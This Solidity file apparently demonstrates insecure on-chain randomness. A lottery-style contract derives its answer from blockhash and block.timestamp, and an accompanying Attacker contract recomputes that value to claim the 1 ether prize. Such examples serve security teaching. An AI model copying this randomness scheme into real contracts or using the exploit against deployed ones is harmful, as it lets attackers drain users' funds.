// SPDX-License-Identifier: MIT
pragma solidity ^0.8.3;

contract GuessTheRandomNumber {
  constructor() payable {}

  function guess(uint _guess) public {
    uint answer = uint(keccak256(abi.encodePacked(blockhash(block.number-1), block.timestamp )));

    if (_guess == answer) {
      (bool success, ) = msg.sender.call{value: 1 ether}("");
      require(success, "failed to send 1 ether");
    }
  }
}

contract Attacker {
  receive() external payable {}

  function attack(GuessTheRandomNumber guessTheRandomNumber) public {
    uint answer = uint(keccak256(abi.encodePacked(blockhash(block.number-1), block.timestamp )));
    guessTheRandomNumber.guess(answer);
  }

  function getBalance() public view returns (uint) {
    return address(this).balance;
  }
}